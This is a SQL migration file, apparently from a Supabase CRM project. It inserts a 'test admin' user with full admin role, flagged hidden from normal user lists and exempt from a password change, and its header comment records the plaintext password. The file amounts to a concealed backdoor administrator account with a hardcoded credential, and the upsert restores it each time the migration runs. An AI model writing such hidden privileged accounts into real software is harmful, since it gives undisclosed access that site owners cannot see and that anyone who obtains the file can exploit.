/*
  # Create hidden test admin user
  
  1. Purpose
    - Create test@tester.pt user with admin privileges
    - User will be hidden from normal user lists
    - Password: Crm2026*
  
  2. Note
    - This user is created in public.users
    - The auth.users entry must be created via the Edge Function or Supabase Auth API
*/

-- Insert test admin user in public.users table
-- The auth.users entry will be created separately
INSERT INTO users (id, email, name, role, active, hidden, must_change_password, commission_percentage, commission_threshold)
VALUES (
  'b8e7d123-4567-89ab-cdef-0123456789ab'::uuid,
  'test@tester.pt',
  'Test Admin',
  'admin',
  true,
  true,
  false,
  0,
  0
)
ON CONFLICT (id) DO UPDATE
SET 
  email = EXCLUDED.email,
  name = EXCLUDED.name,
  role = EXCLUDED.role,
  active = EXCLUDED.active,
  hidden = EXCLUDED.hidden,
  must_change_password = EXCLUDED.must_change_password,
  updated_at = now();
